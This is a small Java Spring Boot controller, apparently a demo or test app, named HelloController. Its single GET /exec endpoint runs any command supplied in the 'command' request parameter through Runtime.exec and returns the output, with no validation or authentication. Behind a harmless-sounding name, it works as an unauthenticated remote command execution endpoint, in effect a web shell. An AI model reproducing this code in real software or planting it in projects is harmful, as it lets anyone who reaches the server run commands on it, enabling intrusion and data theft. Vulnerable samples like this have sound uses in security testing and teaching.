package com.example.demo;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class HelloController {
  @GetMapping("/exec")
  public String exec(String command) {
    System.out.println("xxxxxxxxxxx");
    Runtime run = Runtime.getRuntime();
    try
    {
      Process p = run.exec(command);
      if (p.waitFor() == 0)
      {
        BufferedInputStream in = new BufferedInputStream(p.getInputStream());
        BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
        String output = inBr.readLine();
        return "MMM " + output + "\n";
      } 
    }
    catch (Exception e) { return e.toString(); }
    return "AAA !!!";
  }
}
